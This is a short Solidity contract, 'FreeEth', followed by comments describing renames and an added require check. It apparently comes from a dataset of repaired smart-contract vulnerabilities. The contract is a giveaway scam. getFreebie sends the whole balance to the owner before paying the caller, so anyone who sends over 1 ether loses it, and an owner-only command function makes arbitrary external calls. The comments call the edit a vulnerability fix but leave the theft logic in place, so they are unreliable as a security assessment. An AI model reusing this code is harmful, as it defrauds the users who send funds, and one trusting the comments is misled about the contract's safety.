pragma solidity ^0.4.19;

contract FreeEth {
    address public owner;

    function FreeEth() public {
        owner = msg.sender;
    }

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _address, bytes _data) public payable {
        require(msg.sender == owner);
        require(_address.call.value(msg.value)(_data));
    }
} 

// Changes made:
// 1. Renamed Owner to owner and initialized it in constructor
// 2. Renamed GetFreebie to getFreebie to follow naming convention
// 3. Removed unnecessary if statement in withdraw function
// 4. Renamed Command to command to follow naming convention
// 5. Added require statement to check return value of external call in command function to fix unchecked_low_level_call vulnerability.